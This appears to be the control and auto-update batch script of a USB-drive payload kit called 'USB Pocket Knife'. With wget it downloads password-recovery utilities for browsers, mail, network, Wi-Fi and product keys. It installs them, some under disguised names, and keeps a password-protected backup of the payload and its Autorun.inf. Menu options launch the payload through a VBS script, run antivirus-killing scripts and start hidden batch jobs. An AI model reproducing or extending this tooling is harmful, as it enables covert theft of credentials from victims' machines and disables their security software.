	 IF EXIST %config%\Animation_10.cfg (ECHO      [ Downloading Files [x]                          ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      \________________________________________________/

	  IF EXIST %config%\Animation_1.cfg (GOTO AutoUpdate1)
	  IF EXIST %config%\Animation_2.cfg (GOTO AutoUpdate2)
	  IF EXIST %config%\Animation_3.cfg (GOTO AutoUpdate3)
	  IF EXIST %config%\Animation_4.cfg (GOTO AutoUpdate4)
	  IF EXIST %config%\Animation_5.cfg (GOTO AutoUpdate5)
	  IF EXIST %config%\Animation_6.cfg (GOTO AutoUpdate6)
	  IF EXIST %config%\Animation_7.cfg (GOTO AutoUpdate7)
	  IF EXIST %config%\Animation_8.cfg (GOTO AutoUpdate8)
	  IF EXIST %config%\Animation_9.cfg (GOTO AutoUpdate9)
     IF EXIST %config%\Animation_10.cfg (GOTO AutoUpdate10)

:AutoUpdate1
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/mspass.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_2.cfg
GOTO AutoUpdate
:AutoUpdate2
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/pspv.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_3.cfg
GOTO AutoUpdate
:AutoUpdate3
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/iepv.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_4.cfg
GOTO AutoUpdate
:AutoUpdate4
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/netpass.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_5.cfg
GOTO AutoUpdate
:AutoUpdate5
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/mailpv.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_6.cfg
GOTO AutoUpdate
:AutoUpdate6
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/wirelesskeyview.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_7.cfg
GOTO AutoUpdate
:AutoUpdate7
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/iehv.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_8.cfg
GOTO AutoUpdate
:AutoUpdate8
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/wul.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_9.cfg
GOTO AutoUpdate
:AutoUpdate9
%progdir%\WGET\wget.exe -q http://www.nirsoft.net/utils/produkey.zip -P %tempfld%
REN %config%\Animation_*.cfg Animation_10.cfg
GOTO AutoUpdate
:AutoUpdate10
:: Extract archives
:: Need to figure out how to make this silent so it looks better when it's run
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Please Wait...                                 ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Downloading Files [x] Done!                    ]
	 IF EXIST %config%\Animation_10.cfg (ECHO      [ Extracting Files  [-]                          ])
	 IF EXIST %config%\Animation_12.cfg (ECHO      [ Extracting Files  [x]                          ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      \________________________________________________/

     IF EXIST %config%\Animation_10.cfg (GOTO AutoUpdate11)
     IF EXIST %config%\Animation_12.cfg (GOTO AutoUpdate12)

:AutoUpdate11
cls
%progdir%\7za.exe e -oSYSTEM\TEMP\ -bd -y .\SYSTEM\TEMP\*.zip
REN %config%\Animation_10.cfg Animation_12.cfg
GOTO AutoUpdate10
:AutoUpdate12
:: Copy updated files over older versions.
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Please Wait...                                 ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Downloading Files [x] Done!                    ]
echo      [ Extracting Files  [x] Done!                    ]
	 IF EXIST %config%\Animation_12.cfg (ECHO      [ Installing Files  [-]                          ])
	 IF EXIST %config%\Animation_14.cfg (ECHO      [ Installing Files  [\]                          ])
	 IF EXIST %config%\Animation_15.cfg (ECHO      [ Installing Files  [/]                          ])
	 IF EXIST %config%\Animation_16.cfg (ECHO      [ Installing Files  [-]                          ])
	 IF EXIST %config%\Animation_17.cfg (ECHO      [ Installing Files  [\]                          ])
	 IF EXIST %config%\Animation_18.cfg (ECHO      [ Installing Files  [/]                          ])
	 IF EXIST %config%\Animation_19.cfg (ECHO      [ Installing Files  [-]                          ])
	 IF EXIST %config%\Animation_20.cfg (ECHO      [ Installing Files  [\]                          ])
	 IF EXIST %config%\Animation_21.cfg (ECHO      [ Installing Files  [/]                          ])
	 IF EXIST %config%\Animation_22.cfg (ECHO      [ Installing Files  [-]                          ])
	 IF EXIST %config%\Animation_23.cfg (ECHO      [ Installing Files  [\]                          ])
	 IF EXIST %config%\Animation_24.cfg (ECHO      [ Installing Files  [x]                          ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      \________________________________________________/

     IF EXIST %config%\Animation_12.cfg (GOTO AutoUpdate13)
     IF EXIST %config%\Animation_14.cfg (GOTO AutoUpdate14)
	 IF EXIST %config%\Animation_15.cfg (GOTO AutoUpdate15)
     IF EXIST %config%\Animation_16.cfg (GOTO AutoUpdate16)
     IF EXIST %config%\Animation_17.cfg (GOTO AutoUpdate17)
	 IF EXIST %config%\Animation_18.cfg (GOTO AutoUpdate18)
     IF EXIST %config%\Animation_19.cfg (GOTO AutoUpdate19)
     IF EXIST %config%\Animation_20.cfg (GOTO AutoUpdate20)
     IF EXIST %config%\Animation_21.cfg (GOTO AutoUpdate21)
	 IF EXIST %config%\Animation_22.cfg (GOTO AutoUpdate22)
     IF EXIST %config%\Animation_23.cfg (GOTO AutoUpdate23)
     IF EXIST %config%\Animation_24.cfg (GOTO AutoUpdate24)

:AutoUpdate13
copy /y .\SYSTEM\TEMP\iehv.exe .\SYSTEM\iehv.exe
REN %config%\Animation_12.cfg Animation_14.cfg
GOTO AutoUpdate12
:AutoUpdate14
copy /y .\SYSTEM\TEMP\iepv.exe .\SYSTEM\iepv.exe
REN %config%\Animation_14.cfg Animation_15.cfg
GOTO AutoUpdate12
:AutoUpdate15
copy /y .\SYSTEM\TEMP\imokav.exe .\SYSTEM\imokav.exe
REN %config%\Animation_15.cfg Animation_16.cfg
GOTO AutoUpdate12
:AutoUpdate16
copy /y .\SYSTEM\TEMP\mailpv.exe .\SYSTEM\mailpv.exe
REN %config%\Animation_16.cfg Animation_17.cfg
GOTO AutoUpdate12
:AutoUpdate17
copy /y .\SYSTEM\TEMP\mspass.exe .\SYSTEM\mspass.exe
REN %config%\Animation_17.cfg Animation_18.cfg
GOTO AutoUpdate12
:AutoUpdate18
copy /y .\SYSTEM\TEMP\netpass.exe .\SYSTEM\netpass.exe
REN %config%\Animation_18.cfg Animation_19.cfg
GOTO AutoUpdate12
:AutoUpdate19
copy /y .\SYSTEM\TEMP\ProduKey.exe .\SYSTEM\ProduKey.exe
REN %config%\Animation_19.cfg Animation_20.cfg
GOTO AutoUpdate12
:AutoUpdate20
copy /y .\SYSTEM\TEMP\pspv.exe .\SYSTEM\pspv.exe
REN %config%\Animation_20.cfg Animation_21.cfg
GOTO AutoUpdate12
:AutoUpdate21
copy /y .\SYSTEM\TEMP\wirelesskeyview.exe .\SYSTEM\WIFIKE.EXE
REN %config%\Animation_21.cfg Animation_22.cfg
GOTO AutoUpdate12
:AutoUpdate22
copy /y .\SYSTEM\TEMP\wul.exe .\SYSTEM\wul.exe
REN %config%\Animation_22.cfg Animation_23.cfg
GOTO AutoUpdate12
:AutoUpdate23
copy /y .\SYSTEM\TEMP\lstarget.dll .\SYSTEM\lstarget.dll
REN %config%\Animation_23.cfg Animation_24.cfg
GOTO AutoUpdate12

:AutoUpdate24
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Please Wait...                                 ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Downloading Files [x] Done!                    ]
echo      [ Extracting Files  [x] Done!                    ]
echo      [ Installing Files  [x] Done!                    ]
	 IF EXIST %config%\Animation_24.cfg (ECHO      [ Cleaning Up       [-]                          ])
	 IF EXIST %config%\Animation_26.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_27.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_28.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_29.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_30.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_31.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_32.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_33.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_34.cfg (ECHO      [ Cleaning Up       [x] Done!                    ])
	 IF EXIST %config%\Animation_27.cfg (ECHO      [ Generating Backup [-]                          ])
	 IF EXIST %config%\Animation_28.cfg (ECHO      [ Generating Backup [/]                          ])
	 IF EXIST %config%\Animation_29.cfg (ECHO      [ Generating Backup [\]                          ])
	 IF EXIST %config%\Animation_30.cfg (ECHO      [ Generating Backup [-]                          ])
	 IF EXIST %config%\Animation_31.cfg (ECHO      [ Generating Backup [/]                          ])
	 IF EXIST %config%\Animation_32.cfg (ECHO      [ Generating Backup [\]                          ])
	 IF EXIST %config%\Animation_33.cfg (ECHO      [ Generating Backup [-]                          ])
	 IF EXIST %config%\Animation_34.cfg (ECHO      [ Generating Backup [x]                          ])
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
	 IF EXIST %config%\Animation_24.cfg (ECHO      [                                                ])
	 IF EXIST %config%\Animation_26.cfg (ECHO      [                                                ])

echo      \________________________________________________/

     IF EXIST %config%\Animation_24.cfg (GOTO AutoUpdate25)
     IF EXIST %config%\Animation_26.cfg (GOTO AutoUpdate26)
	 IF EXIST %config%\Animation_27.cfg (GOTO AutoUpdate27)
	 IF EXIST %config%\Animation_28.cfg (GOTO AutoUpdate28)
	 IF EXIST %config%\Animation_29.cfg (GOTO AutoUpdate29)
	 IF EXIST %config%\Animation_30.cfg (GOTO AutoUpdate30)
	 IF EXIST %config%\Animation_31.cfg (GOTO AutoUpdate31)
	 IF EXIST %config%\Animation_32.cfg (GOTO AutoUpdate32)
	 IF EXIST %config%\Animation_33.cfg (GOTO AutoUpdate33)
	 IF EXIST %config%\Animation_34.cfg (GOTO AutoUpdate34)

:AutoUpdate25
:: Remove Archives and extracted files.
del /f /q .\SYSTEM\TEMP\*
REN %config%\Animation_24.cfg Animation_26.cfg
GOTO AutoUpdate24
:AutoUpdate26
:: Deleat the old Backup
IF EXIST .\SYSTEM\BACKUP\Backup.rar (DEL .\SYSTEM\BACKUP\Backup.rar)
REN %config%\Animation_26.cfg Animation_27.cfg
GOTO AutoUpdate24
:AutoUpdate27
:: Backs up entire payload
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\Menu.bat"
REN %config%\Animation_27.cfg Animation_28.cfg
GOTO AutoUpdate24
:AutoUpdate28
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\Autorun.inf"
REN %config%\Animation_28.cfg Animation_29.cfg
GOTO AutoUpdate24
:AutoUpdate29
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\CONFIG\"
REN %config%\Animation_29.cfg Animation_30.cfg
GOTO AutoUpdate24
:AutoUpdate30
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\TOOLS\"
REN %config%\Animation_30.cfg Animation_31.cfg
GOTO AutoUpdate24
:AutoUpdate31
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\SYSTEM\INSTALL\"
REN %config%\Animation_31.cfg Animation_32.cfg
GOTO AutoUpdate24
:AutoUpdate32
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\SYSTEM\"
REN %config%\Animation_32.cfg Animation_33.cfg
GOTO AutoUpdate24
:AutoUpdate33
.\SYSTEM\rar.exe a -hp[4369462e7651316962562d4c6931697676652e626d366d57503b287246] -inul -r -m0 ".\SYSTEM\BACKUP\Backup.rar" ".\SYSTEM\Start.bat"
REN %config%\Animation_33.cfg Animation_34.cfg
GOTO AutoUpdate24
:AutoUpdate34
REN %config%\Animation_34.cfg Animation_1.cfg
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Downloading Files [x] Done!                    ]
echo      [ Extracting Files  [x] Done!                    ]
echo      [ Installing Files  [x] Done!                    ]
echo      [ Cleaning Up       [x] Done!                    ]
echo      [ Generating Backup [x] Done!                    ]
echo      [                                                ]
echo      [ Various executables have been updated to their ]
echo      [ latest versions                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto MENU
::
:RunPayload
cls
start /wait %u3%\SYSTEM\GO.VBS
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ The USB Pocket Knife on Removable Drive has    ]
echo      [ been Started.                                  ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto MENU
::
:OpenRoot
cls
start /wait %flshdrv%\
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ Root folder of Pocket Knife has been opened    ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto MENU
::
:avkill
cls
start /wait %flshdrv%\BATCH\avkill.bat
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Confirmation...                                ]
echo      \________________________________________________/
echo      [                                                ]
echo      [ avkill has run                                 ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto MENU
::
:BatchFiles
cls
echo. 
echo             USB Pocket Knife Utilities by Leapo
echo. 
echo       ________________________________________________
echo      /                                                \
echo      [ Batch Files Payload:                           ]
echo.     \________________________________________________/
echo.     [                                                ]
echo      [ 1. Batch 1                                     ]
echo      [ 2. Batch 2                                     ]
echo      [ 3. Batch 3                                     ]
echo      [ 4. Batch 4                                     ]
echo      [ 5. Batch 5                                     ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [                                                ]
echo      [________________________________________________]
echo      [                                                ]
echo      [ M. Back to Main Menu                           ]
echo      [ Q. Quit                                        ]
echo      \________________________________________________/
echo.
set choice=
set /p choice=      Enter option: 
echo.
if not '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='1' goto batch1
if '%choice%'=='2' goto batch2
if '%choice%'=='3' goto batch3
if '%choice%'=='4' goto batch4
if '%choice%'=='5' goto LIVE AVKILL
if '%choice%'=='M' goto Menu
if '%choice%'=='m' goto Menu
if '%choice%'=='Q' goto End
if '%choice%'=='q' goto End
goto ComponentsMenu
::
:batch1
:: Run a VBS script to hide the batch files while running
start /wait %flshdrv%\BATCH\batch1.bat
::
:batch2
echo batch 2 works
::
:batch3
cls
start /wait %flshdrv%\BATCH\batch3.bat
::
:batch4
cls
start /wait %flshdrv%\BATCH\batch4.bat
::
:batch5
cls
start /min %flshdrv%\BATCH\avkill_live.bat
::
:End
EXIT